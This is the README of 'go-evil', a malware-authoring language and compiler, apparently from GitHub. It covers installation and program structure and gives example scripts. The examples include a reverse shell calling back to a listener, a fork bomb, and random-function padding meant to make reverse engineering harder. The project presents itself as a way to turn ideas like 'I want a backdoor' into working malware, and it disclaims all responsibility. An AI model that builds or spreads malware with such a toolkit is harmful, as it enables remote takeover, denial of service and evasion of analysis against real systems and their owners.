# Go-evil - Customizing evil has never been so easy

<img src="./images/logo.png" width="1000"/>


[![Check if the compiler passes all tests](https://github.com/s9rA16Bf4/go-evil/actions/workflows/check_compiler.yml/badge.svg)](https://github.com/s9rA16Bf4/go-evil/actions/workflows/check_compiler.yml)

## Table of contents
<!--ts-->
   * [Description](#Description)
   * [Installation](#Installation)
      * [Docker](#Docker)
      * [Locally](#Locally)
   * [Anatomy of a go-evil based malware](#anatomy-of-a-go-evil-based-malware)
   * [Examples](#Examples)
        * [Hello world](#Hello-world)
        * [If/else statements](#If/else-statements)
        * [Foreach](#Foreach)
        * [Generating 32 random functions](#Generating-32-random-functions)
        * [Wait until](#Wait-until)
        * [Connecting a javascript button to a call function](#Connecting-a-javascript-button-to-a-call-function)
        * [Reverse shell](#Reverse-shell)
        * [Fork bomb](#Fork-bomb)
   * [Documentation](#Documentation)
        * [Examples](#examples)
        * [Godoc](#Godoc)
        * [Cookbook](#cookbook)
   * [Legal notice](#legal-notice)

<!--te-->

## Description
Go-evil is a red teams wet dream, a tool to beat all other tools of it's kind.<br>
What is go-evil, I hear you ask? Go-evil is a project all about the art of creating malware with a simpel language.<br>
The programming language we utilize is called evil, which only purpose is to translate ideas like "Hey I want a backdoor" into working code without the malware artist needing to know every every nook and cranny.<br> 



## Installation
### Docker
You can run the compiler through docker and by executing the statements shown below!

Run `make docker` to build the docker image.

Create a folder labeled `builds` in your local directory, this will be the directory where you want to place all your files to compile.

Run the following command `docker run -v $(pwd)/builds:/app/builds --rm goevil/gevil-<version> <commands>`

An example of this can be `docker run -v $(pwd)/builds:/app/builds --rm goevil/gevil-<version> -f builds/out.evil -bd builds` which will compile the `out.evil` file and create the binary `builds/out`.

But if you're lazy you can also utilize the script labeled `gevil` under the `tools` directory `bash tools/gevil <commands>` which will do all work for you.

### Locally
If you still want to compile the project locally, just run `make dependencies` and `make` to compile the project. After this you can utilize the compiler as intended. 

## Anatomy of a go-evil based malware
We have currently three different functions, these are marked by a one character long string preceding the functions name.<br/>
And of course they have different meanings.

1. `boot`, these are functions that will be automatically called on boot of the program.
2. `loop`, these are functions that will be automatically called within the for-loop in the main function.
3. `call`, these are functions that will need to be called by the developer, e.g. `self::call("<function_name>")` or through a binding.
4. `end`, functions that are called just before the malware exits

Shown below is the general structure that each malware compiled by goevil has in their source code.
```
package main

import(
    ...
    )

// Structs

// Consts

// Global variables
...

// Function def
...

func main(){
    // Calling `boot` functions
    ...

    for <behavior pattern> {
        // Calling `loop` functions
        ...
    }

    // Calling `end` functions
}

```

## Examples
### Hello world
```
@ Showcases how you print a message @

use system

[
    version 2.0
    output out
    os linux
    arch amd64
    obfuscate false
]


b boot {
    system::outln("Hello from boot!")
}

l main_func {
    system::outln("Hello from main!")
    system::exit("0")
}
```

### If/else statements
```
@ Showcases how an if/else statement looks like @
@ The allowed operators are... @
@ > - larger @
@ < - smaller @
@ == - equals @
@ != - does not equal @
@ >= - larger or equals @
@ <= - smaller or equals @

use system
use self

[
    version 2.0
    output if_else
    os linux
    arch amd64
    obfuscate false
    debugger_behavior stop
]


l main_func {
   
    if(${"1", ">", "2"}$):
        system::outln("1 is bigger than 2")
    else:
        system::outln("1 is smaller than 2")
    end if

    system::exit("0")
}
```
### Foreach
```
@ Showcases how a for-loop/foreach-loop works @

use system

[
    version 2.0
    output foreach
    os linux
    arch amd64
    obfuscate false
    debugger_behavior stop
]


l main_func {
    foreach(${"1","2","3","4","5"}$):
        system::outln("€13€") @ The index €13€ is configured to only be used by foreach loops @
    end foreach
    
    system::exit("0")
}
```

### Generating 32 random functions
```
@ This example shows that go-evil v2 has the ability to add an n amount of @
@ random function to your source code, which can act like a padding @
@ but can also act like a factor to make it harder to reverse-engineer @

use system
use self

[
    version 2.0
    output random_func
    os linux
    arch amd64
    obfuscate false
    debugger_behavior stop
]


l main_func {
    self::add_random_func("32") @ Adds 32 randomly definied functions to the src code @
    system::outln("The definied functions don't effect the program itself, but sure as hell padds out the binary file")
    system::outln("Compile with the debug flag to see the result")

    system::exit("0")
}

```

### Wait until
```
@ Shows the until function in the time domain @
@ Supported formats @
@ - YYYY/MM/DD-hh:mm @ 
@ - hh:mm @

use system
use time

[
    version 2.0
    output until
    os linux
    arch amd64
    obfuscate false
    debugger_behavior stop
]

l main_func {
    time::until("10:45") @ The program will launch after 10:45 @
    system::outln("Hello I've launched!!")
    
    system::outln("Let us try this again!!")
    
    time::until("2023/04/09-10:50")
    system::outln("Finishing up!")

    system::exit("0")
}
```


### Connecting a javascript button to a call function
```
@ Showcasing how you can bind an evil function to a javascript call @

use system
use window

[
    version 2.0
    output bind
    os linux
    arch amd64
    obfuscate false
]

c test1 -> null {
    system::outln("I've been summoned!")
}

b bind {
    @ Essentially saying that when the js function button is called, call test1 @
    window::bind(${"button", "test1"}$) @ The ${...}$ is known as an evil array @ 

    window::js("function testing() {window.button();}")

    window::html("<p>Watch the console after pressing the button!</p>")
    window::html("<input type='submit' onclick='testing()'>")

    window::run()
}

l loop {
    system::exit("0")
}
```

Running the code above will result in the following
![image](https://user-images.githubusercontent.com/14398606/189844664-0d870f9a-4a27-401f-a6ec-619fb8556cd4.png)

### Reverse shell
```
@ Performs a reverse shell back to the attacker @
@ To check if the reverse shell works, run the following nc -l 8080 @

use system
use network

[
    version 2.0
    output reverse_shell
    os linux
    arch amd64
    obfuscate false
    debugger_behavior stop
]


l main_func {
    network::reverse_shell(${"127.0.0.1", "8080"}$)

    system::exit("0")
}
```

### Fork bomb
```
@ Executes a fork bomb @

use system
use bombs
use time

[
    version 2.0
    output fork_bomb
    os linux
    arch amd64
    obfuscate false
    debugger_behavior stop
]

c executioner -> boolean { @ When this function returns, the bomb is executed @
    system::outln("I'm the bomb!")
    time::sleep("600") @ Sleep for 10 minutes before returning @
}

l main_func {
    system::outln("Warning: Do not try this on your own machine!")
    bombs::fork_bomb(${"500", "executioner"}$) @ 500 ms until it blows up @
    system::exit("0")
}
```

## Documentation
### Examples
We strive to have a corresponding example file/files for each implemented feature, meaning that the currently best way to see how to implemenet a certain area
is to look in the `examples` folder
### Godoc
If you're willing to see all the possible functions and such, take a look at  `tools/serve_documentation.sh` which will locally host a godoc server on port 8080
### Cookbook
We are also working on a so-called "cookbook" which will go into a further detail on how everything works. But this book is not yet completed.

## Legal notice
I take no responsibility for what you create and do with this project. And any mischief that you cause and happen to fall into is on yourself!
But do share your art, as it's fun to see!



